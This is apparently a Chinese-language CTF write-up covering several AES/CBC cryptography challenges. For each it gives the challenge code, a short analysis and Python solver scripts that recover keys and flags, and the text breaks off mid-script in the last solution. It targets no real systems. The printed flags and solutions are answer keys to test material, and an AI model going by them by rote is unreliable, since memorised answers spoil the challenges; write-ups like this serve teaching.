<h2 id="babyAES"><a href="#babyAES" class="headerlink" title="babyAES"></a>babyAES</h2><h3 id="题目-9"><a href="#题目-9" class="headerlink" title="题目"></a>题目</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line">my_aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">flag += (<span class="number">16</span> - <span class="built_in">len</span>(flag) % <span class="number">16</span>) * <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">c = my_aes.encrypt(flag)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(iv)</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"> </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b&#x27;C4:\x86Q$\xb0\xd1\x1b\xa9L\x00\xad\xa3\xff\x96 hJ\x1b~\x1c\xd1y\x87A\xfe0\xe2\xfb\xc7\xb7\x7f^\xc8\x9aP\xdaX\xc6\xdf\x17l=K\x95\xd07&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\xd1\xdf\x8f)\x08w\xde\xf9yX%\xca[\xcb\x18\x80&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\xa4\xa6M\xab&#123;\xf6\x97\x94&gt;hK\x9bBe]F&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="题目分析-4"><a href="#题目分析-4" class="headerlink" title="题目分析"></a>题目分析</h3><p>已知 iv key 密文c  CBC模式</p>
<p>直接 aes解密可得到明文</p>
<h3 id="WP-8"><a href="#WP-8" class="headerlink" title="WP"></a>WP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">c = <span class="string">b&#x27;C4:\x86Q$\xb0\xd1\x1b\xa9L\x00\xad\xa3\xff\x96 hJ\x1b~\x1c\xd1y\x87A\xfe0\xe2\xfb\xc7\xb7\x7f^\xc8\x9aP\xdaX\xc6\xdf\x17l=K\x95\xd07&#x27;</span></span><br><span class="line">iv = <span class="string">b&#x27;\xd1\xdf\x8f)\x08w\xde\xf9yX%\xca[\xcb\x18\x80&#x27;</span></span><br><span class="line">key = <span class="string">b&#x27;\xa4\xa6M\xab&#123;\xf6\x97\x94&gt;hK\x9bBe]F&#x27;</span></span><br><span class="line"> </span><br><span class="line">Cipher = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">decrypted = Cipher.decrypt(c)</span><br><span class="line"><span class="built_in">print</span>(decrypted)</span><br><span class="line"><span class="comment"># b&#x27;Dest0g3&#123;d0e5fa76-e50f-76f6-9cf1-b6c2d576b6f4&#125;\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure>



<h2 id="MyOwnCBC"><a href="#MyOwnCBC" class="headerlink" title="MyOwnCBC"></a>MyOwnCBC</h2><h3 id="题目-10"><a href="#题目-10" class="headerlink" title="题目"></a>题目</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2.7</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">MyOwnCBC</span>(<span class="params">key, plain</span>):</span><br><span class="line">  <span class="comment"># key 32位  但key未知</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(key)!=<span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;error!&quot;</span></span><br><span class="line">    cipher_txt = <span class="string">b&quot;&quot;</span></span><br><span class="line">    cipher_arr = []</span><br><span class="line">    <span class="comment"># 自定义加密 ECB</span></span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="comment"># 等价于 cipher = AES.new(key, AES.MODE_ECB)</span></span><br><span class="line">    plain = [plain[i:i+<span class="number">32</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(plain), <span class="number">32</span>)]</span><br><span class="line">    <span class="comment"># 32位(16字节)为一组 然后进行ECB加密</span></span><br><span class="line">    <span class="built_in">print</span> plain</span><br><span class="line">    <span class="comment"># 加密后 存入密文数组   </span></span><br><span class="line">    cipher_arr.append(cipher.encrypt(plain[<span class="number">0</span>]))</span><br><span class="line">    cipher_txt += cipher_arr[<span class="number">0</span>]</span><br><span class="line">     </span><br><span class="line">    <span class="comment"># cipher_txt = [cipher_arr[i]] </span></span><br><span class="line">    <span class="comment"># 上一个密文 作为 下一个密文的密钥key进行加密</span></span><br><span class="line">    <span class="comment"># key0 为第一组的密文 即 key0 = cipher[0:32]</span></span><br><span class="line">    <span class="comment"># 然后以 前一个 cipher_arr[i-1]作为key 进行ecb加密</span></span><br><span class="line">    <span class="comment">#   cipher_arr[i-1] ^ cipher_arr[i]</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(plain)):</span><br><span class="line">        cipher = AES.new(cipher_arr[i-<span class="number">1</span>], AES.MODE_ECB, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        cipher_arr.append(cipher.encrypt(plain[i]))</span><br><span class="line">        cipher_txt += cipher_arr[i]</span><br><span class="line">    <span class="keyword">return</span> cipher_txt</span><br><span class="line">     </span><br><span class="line"><span class="comment"># 生成256位的随机整数  </span></span><br><span class="line">key = random.getrandbits(<span class="number">256</span>)</span><br><span class="line">key = long_to_bytes(key)</span><br><span class="line"> </span><br><span class="line">s = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    s = f.read()</span><br><span class="line">    f.close()</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 密文写入到flag_cipher 是已知项</span></span><br><span class="line"><span class="comment"># 长度为 6A0h = 1696</span></span><br><span class="line"><span class="comment"># 1696 / 32 = 53组</span></span><br><span class="line"><span class="comment"># 由于上一个密文作为key 参与下一次密文加密 所以长度都相同</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag_cipher&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(MyOwnCBC(key, s))</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure>

<h3 id="题目分析-5"><a href="#题目分析-5" class="headerlink" title="题目分析"></a>题目分析</h3><p>plain = [plain[i:i+32] for i in range(0, len(plain), 32)] # 32位一组</p>
<p>第一次密文 作为密钥key0参与ECB加密  key = cipher[:32]</p>
<h3 id="WP-9"><a href="#WP-9" class="headerlink" title="WP"></a>WP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag_cipher&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    <span class="comment"># print(len(fp.read()))</span></span><br><span class="line">    cipher = fp.read()</span><br><span class="line">    fp.close()</span><br><span class="line"> </span><br><span class="line">key0 = cipher[:<span class="number">32</span>]</span><br><span class="line"><span class="built_in">print</span>(key0)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">MyOwnCBC</span>(<span class="params">key0,cipher</span>):</span><br><span class="line">    cipher = [cipher[i:i + <span class="number">32</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cipher), <span class="number">32</span>)]</span><br><span class="line">    m = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    tmpkey = key0</span><br><span class="line">    <span class="comment"># 上一次的密文作为key参与下一次ECB</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(cipher)):</span><br><span class="line">        aes = AES.new(tmpkey,AES.MODE_ECB)</span><br><span class="line">        m += aes.decrypt(cipher[i])</span><br><span class="line">        tmpkey = cipher[i]</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(MyOwnCBC(key0,cipher))</span><br><span class="line"><span class="comment">#b&#x27;\xe5\xdf\x94sJ\xc2\xcd\x04\xeb\xb7\xcf\x05(\xbe\x98\\\xe9\xc3^\x1f!\xfb\xea6\xdac\x1f\xfe\x901\xbb\x13&#x27;</span></span><br><span class="line"><span class="comment">#b&quot;mode of operation is an algorithm that uses a block cipher to provide an information service such as confidentiality or authenticity. A block cipher by itself is only suitable for the secure cryptographic transformation (encryption or decryption) of one fixed-length group of bits called a block. A mode of operation describes how to repeatedly apply a cipher&#x27;s single-block operation to securely transform amounts of data larger than a block.\n\nMost modes require a unique binary sequence, often called an initialization vector (IV), for each encryption operation. The IV has to be non-repeating and, for some modes, random as well. The initialization vector is used to ensure distinct ciphertexts are produced even when the same plaintext is encrypted multiple times independently with the same key. Block ciphers have one or more block size(s), but during transformation the block size is always fixed. Block cipher modes operate on whole blocks and require that the last part of the data be padded to a full block if it is smaller than the current block size. There are, however, modes that do not require padding because they effectively use a block cipher as a stream cipher.\n\nHistorically, encryption modes have been studied extensively in regard to their error propagation properties under various scenarios of data modification. Later development regarded integrity protection as an entirely separate cryptographic goal. Some modern modes of operation combine confidentiality and authenticity in an efficient way, and are known as authenticated encryption modes.\n\nAh you found it~ afctf&#123;Don&#x27;t_be_fooled_by_yourself&#125;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="moectf-ez-cbc"><a href="#moectf-ez-cbc" class="headerlink" title="moectf ez_cbc"></a>moectf ez_cbc</h2><h3 id="题目-11"><a href="#题目-11" class="headerlink" title="题目"></a>题目</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">  </span><br><span class="line">IV = bytes_to_long(<span class="string">b&#x27;cbc!&#x27;</span>)</span><br><span class="line">K = random.randrange(<span class="number">1</span>,<span class="number">1</span>&lt;&lt;<span class="number">30</span>)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">7</span>] == <span class="string">b&#x27;moectf&#123;&#x27;</span></span><br><span class="line"><span class="keyword">assert</span> flag[-<span class="number">1</span>:] == <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">  </span><br><span class="line">block_length = <span class="number">4</span></span><br><span class="line">flag = flag + ((block_length - <span class="built_in">len</span>(flag) % block_length) % block_length) * <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">plain_block = [flag[block_length * i: block_length * (i + <span class="number">1</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag) // block_length)]</span><br><span class="line">  </span><br><span class="line">c = []</span><br><span class="line">c0 = (IV ^ bytes_to_long(plain_block[<span class="number">0</span>])) ^ K</span><br><span class="line">c.append(c0)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plain_block)-<span class="number">1</span>):</span><br><span class="line">    c.append(c[i] ^ bytes_to_long(plain_block[i+<span class="number">1</span>]) ^ K)</span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">  </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[748044282, 2053864743, 734492413, 675117672, 1691099828, 1729574447, 1691102180, 657669994, 1741780405, 842228028, 1909206003, 1797919307]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#  flag =  moectf&#123; &#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="题目分析-6"><a href="#题目分析-6" class="headerlink" title="题目分析"></a>题目分析</h3><p>block_length =4 且 已知flag前四位为 moec</p>
<p>所以可以通过此去恢复K</p>
<p>密文块 = 明文块 ^ iv ^ K</p>
<p>明文块 = 密文块 ^ iv ^ K</p>
<p>K = 密文块 ^ 明文块 ^ iv</p>
<p>K = IV ^ bytes_to_long(plain_block[0]) ^ c[0]</p>
<h3 id="WP-10"><a href="#WP-10" class="headerlink" title="WP"></a>WP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">c = [<span class="number">748044282</span>, <span class="number">2053864743</span>, <span class="number">734492413</span>, <span class="number">675117672</span>, <span class="number">1691099828</span>, <span class="number">1729574447</span>, <span class="number">1691102180</span>, <span class="number">657669994</span>, <span class="number">1741780405</span>, <span class="number">842228028</span>, <span class="number">1909206003</span>, <span class="number">1797919307</span>]</span><br><span class="line">IV = bytes_to_long(<span class="string">b&#x27;cbc!&#x27;</span>)</span><br><span class="line">block_length = <span class="number">4</span></span><br><span class="line"> </span><br><span class="line">flag = <span class="string">b&#x27;moectf&#123;&#x27;</span></span><br><span class="line">plain_block = [flag[block_length * i: block_length * (i + <span class="number">1</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag) // block_length)]</span><br><span class="line"> </span><br><span class="line">K = IV ^ bytes_to_long(plain_block[<span class="number">0</span>]) ^ c[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(K)</span><br><span class="line"> </span><br><span class="line">m = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)-<span class="number">1</span>):</span><br><span class="line">    m += long_to_bytes(c[i]^c[i+<span class="number">1</span>]^K)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;moec&#x27;</span>+m)</span><br><span class="line"><span class="comment"># 580598200</span></span><br><span class="line"><span class="comment"># b&#x27;tf&#123;es72b!a5-njad!@-#!@$sad-6bysgwy-1adsw8&#125;\x00\x00&#x27;</span></span><br><span class="line"><span class="comment"># b&#x27;moectf&#123;es72b!a5-njad!@-#!@$sad-6bysgwy-1adsw8&#125;\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure>





<h3 id="moectf-ez-chain"><a href="#moectf-ez-chain" class="headerlink" title="moectf ez_chain"></a>moectf ez_chain</h3><h3 id="题目-12"><a href="#题目-12" class="headerlink" title="题目"></a>题目</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;key.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> fs:</span><br><span class="line">    key = <span class="built_in">int</span>(fs.read().strip())</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fs:</span><br><span class="line">    flag = fs.read().strip()</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">72</span></span><br><span class="line"> </span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"> </span><br><span class="line">base = bytes_to_long(<span class="string">b&quot;koito&quot;</span>)</span><br><span class="line">iv = <span class="number">3735927943</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blockize</span>(<span class="params">long</span>):</span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">while</span> long &gt; <span class="number">0</span>:</span><br><span class="line">        out.append(long % base)</span><br><span class="line">        long //= base</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">reversed</span>(out))</span><br><span class="line"> </span><br><span class="line">blocks = blockize(m)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_block_cbc</span>(<span class="params">blocks, iv, key</span>):</span><br><span class="line">    encrypted = [iv]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(blocks)):</span><br><span class="line">        encrypted.append(blocks[i] ^ encrypted[i] ^ key)</span><br><span class="line">    <span class="keyword">return</span> encrypted[<span class="number">1</span>:]</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(encrypt_block_cbc(blocks, iv, key))</span><br><span class="line"><span class="comment"># [8490961288, 122685644196, 349851982069, 319462619019, 74697733110, 43107579733, 465430019828, 178715374673, 425695308534, 164022852989, 435966065649, 222907886694, 420391941825, 173833246025, 329708930734]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="题目分析-7"><a href="#题目分析-7" class="headerlink" title="题目分析"></a>题目分析</h3><p>写一个 decrypt_block_cbc 和 deblockize函数</p>
<p>K = 密文块 ^ 明文块 ^ iv</p>
<h3 id="WP-11"><a href="#WP-11" class="headerlink" title="WP"></a>WP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">base = bytes_to_long(<span class="string">b&quot;koito&quot;</span>)</span><br><span class="line">iv = <span class="number">3735927943</span></span><br><span class="line"> </span><br><span class="line">blocks = [<span class="number">8490961288</span>, <span class="number">122685644196</span>, <span class="number">349851982069</span>, <span class="number">319462619019</span>, <span class="number">74697733110</span>, <span class="number">43107579733</span>, <span class="number">465430019828</span>, <span class="number">178715374673</span>, <span class="number">425695308534</span>, <span class="number">164022852989</span>, <span class="number">435966065649</span>, <span class="number">222907886694</span>, <span class="number">420391941825</span>, <span class="number">173833246025</span>, <span class="number">329708930734</span>]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blockize</span>(<span class="params">long</span>):</span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">while</span> long &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># 取余数 存入 out</span></span><br><span class="line">        out.append(long % base)</span><br><span class="line">        long //= base</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">reversed</span>(out))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deblockize</span>(<span class="params">blocks</span>):</span><br><span class="line">    out = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> blocks:</span><br><span class="line">        out = out * base + block</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_block_cbc</span>(<span class="params">blocks, iv, key</span>):</span><br><span class="line">    encrypted = [iv]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(blocks)):</span><br><span class="line">        encrypted.append(blocks[i] ^ encrypted[i] ^ key)</span><br><span class="line">    <span class="keyword">return</span> encrypted[<span class="number">1</span>:]</span><br><span class="line"><span class="comment"># blocks[0] ^ iv ^ key =  flag[0]</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_block_cbc</span>(<span class="params">blocks, iv, key</span>):</span><br><span class="line">    <span class="comment"># iv 初始化向量</span></span><br><span class="line">    encrypted = [iv, *blocks]</span><br><span class="line">    decrypted = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(blocks)):</span><br><span class="line">        decrypted.append(encrypted[i] ^ encrypted[i + <span class="number">1</span>] ^ key)</span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br><span class="line"> </span><br><span class="line"><span class="comment">#  flag = moectf&#123;xxx&#125;</span></span><br><span class="line"><span class="comment">#  72个字符  其中 moectf 6 &#123;&#125; 2  72-2-6=64个</span></span><br><span class="line"><span class="comment">#  flag[0] = blocks[0] ^ key ^ iv</span></span><br><span class="line"><span class="comment">#  key = iv ^ blocks[0] ^ flag[0]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span>,blockize(bytes_to_long(<span class="string">b&quot;moectf&#123;&quot;</span> + <span class="string">b&quot;0&quot;</span>*<span class="number">64</span> + <span class="string">b&quot;&#125;&quot;</span>))[<span class="number">0</span>] )</span><br><span class="line"><span class="comment"># print(blockize(bytes_to_long(b&quot;moectf&#123;&quot; + b&quot;0&quot;*64 + b&quot;&#125;&quot;)))</span></span><br><span class="line">key = blockize(bytes_to_long(<span class="string">b&quot;moectf&#123;&quot;</span> + <span class="string">b&quot;0&quot;</span>*<span class="number">64</span> + <span class="string">b&quot;&#125;&quot;</span>))[<span class="number">0</span>] ^ iv ^ blocks[<span class="number">0</span>]</span><br><span class="line">m = long_to_bytes(deblockize(decrypt_block_cbc(blocks, iv, key)))</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;key:&quot;</span>,key)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="aes3"><a href="#aes3" class="headerlink" title="aes3"></a>aes3</h2><h3 id="题目-13"><a href="#题目-13" class="headerlink" title="题目"></a>题目</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">rom Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"> </span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>] == <span class="string">&quot;flag&#123;&quot;</span> <span class="keyword">and</span> flag[-<span class="number">1</span>:] == <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"> </span><br><span class="line">key = <span class="string">b&quot;J1fx2g1jDak1c***&quot;</span></span><br><span class="line">l = <span class="built_in">len</span>(key)</span><br><span class="line"> </span><br><span class="line">message = <span class="string">b&quot;I have had my invitation to this world&#x27;s festival, and thus my life has been blessed&quot;</span> + binascii.unhexlify(hashlib.sha256(key).hexdigest())[:<span class="number">10</span>]</span><br><span class="line"> </span><br><span class="line">iv = flag[<span class="number">5</span>:-<span class="number">1</span>]</span><br><span class="line">message = message + <span class="built_in">bytes</span>((l - <span class="built_in">len</span>(message) % l) * <span class="built_in">chr</span>(l - <span class="built_in">len</span>(message) % l), encoding = <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"><span class="built_in">print</span>(binascii.hexlify(aes.encrypt(message)))</span><br><span class="line"><span class="comment">#******************************************************************************************************************************************************6ece036e495d363b647d7f2749c4c2f3dd78f8637b</span></span><br></pre></td></tr></table></figure>

<h3 id="题目分析-8"><a href="#题目分析-8" class="headerlink" title="题目分析"></a>题目分析</h3><p>1.key后三位未知 可爆破</p>
<p>2.明文message 分3部分 第一部分明文已知，中间部分 10个十六进制字符  后部分为 2个0x02 共192个十六进制字符</p>
<p>message = message + bytes((l - len(message) % l) * chr(l - len(message) % l), encoding = “utf-8”)</p>
<p>即 bytes((16-94)%16 * chr((16-(94%16)))）</p>
<p>= bytes(2 * chr (2) ) -&gt; 0x02 0x02</p>
<p>3.iv = flag[5:-1] 即flag{iv} 求出iv即flag</p>
<p>4.已知明文后21字节 根据分组 每组16字节 所以已知最后一块明文 及 倒数第二块后5字节明文</p>
<p><img src="/posts/22530663/1.png"></p>
<p>在CBC中 与ECB相比 多的部分为IV 异或一步</p>
<p>密文 ^ key (AES_ECB)  ^ IV → 明文</p>
<p>最后一块的明文已知</p>
<p>key 可通过爆破后三位</p>
<p>最后一块的密文为  b”ssed” + binascii.unhexlify(hashlib.sha256(key).hexdigest())[:10] +  bytes((l - len(message) % l) * chr(l - len(message) % l)  如果key已知  则密文也就是已知的</p>
<p>我们还知道倒数第二块中的后5个字节  可以作为最后一次加密的IV 的一部分进行校验 </p>
<p>IV = 明文 ^ ( 密文 ^ key )</p>
<p>如果 结果中包含 已知的5个字节 说明key正确</p>
<p>求得key后 可进而推出 IV 即 flag</p>
<p>Plaintext[0] = Ciphertext[0] ^ key ^ IV</p>
<p>Plaintext[1] = Ciphertext[1] ^ key ^ Ciphertext[0]</p>
<p>Plaintext[2] = Ciphertext[2] ^ key ^ Ciphertext[1]</p>
<p>知道最后一个明文 密文 key 以此反复推出IV</p>
<h3 id="WP-12"><a href="#WP-12" class="headerlink" title="WP"></a>WP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 1. 生成key字典</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"> </span><br><span class="line">dic = string.printable[:<span class="number">62</span>]</span><br><span class="line"><span class="comment"># print(dic)</span></span><br><span class="line"><span class="comment"># 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;key_table.txt&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> dic:</span><br><span class="line">                key = <span class="string">b&quot;J1fx2g1jDak1c&quot;</span>+i.encode()+j.encode()+k.encode()</span><br><span class="line">                file.write(key+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">file.close()</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 2.爆破key</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">m: <span class="built_in">bytes</span>, c: <span class="built_in">bytes</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([i ^ j <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(m, c)])</span><br><span class="line"> </span><br><span class="line">enc = binascii.unhexlify(<span class="string">&#x27;5d363b647d7f2749c4c2f3dd78f8637b&#x27;</span>)</span><br><span class="line">five_part = binascii.unhexlify(<span class="string">b&quot;6ece036e49&quot;</span>)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;key_table.txt&quot;</span>,<span class="string">&quot;rb+&quot;</span>)</span><br><span class="line">pbar = tqdm(<span class="built_in">range</span>(<span class="number">238328</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">    key = i[:<span class="number">16</span>]</span><br><span class="line">    aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    dec = aes.decrypt(enc)</span><br><span class="line">    <span class="comment"># 一块 16个字节 4+10+2</span></span><br><span class="line">    m = <span class="string">b&quot;ssed&quot;</span> +binascii.unhexlify(hashlib.sha256(key).hexdigest())[:<span class="number">10</span>]+<span class="string">b&#x27;\x02\x02&#x27;</span></span><br><span class="line">    xor_result = xor(m,dec)</span><br><span class="line">    pbar.update(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> five_part <span class="keyword">in</span> xor_result:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] key:&quot;</span>,key)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">f.close()</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 3.求IV</span></span><br><span class="line">l = <span class="built_in">len</span>(key)</span><br><span class="line"><span class="comment"># 192</span></span><br><span class="line">message = <span class="string">b&quot;I have had my invitation to this world&#x27;s festival, and thus my life has been blessed&quot;</span> + binascii.unhexlify(hashlib.sha256(key).hexdigest())[:<span class="number">10</span>]</span><br><span class="line">message = message + <span class="built_in">bytes</span>((l - <span class="built_in">len</span>(message) % l) * <span class="built_in">chr</span>(l - <span class="built_in">len</span>(message) % l), encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span 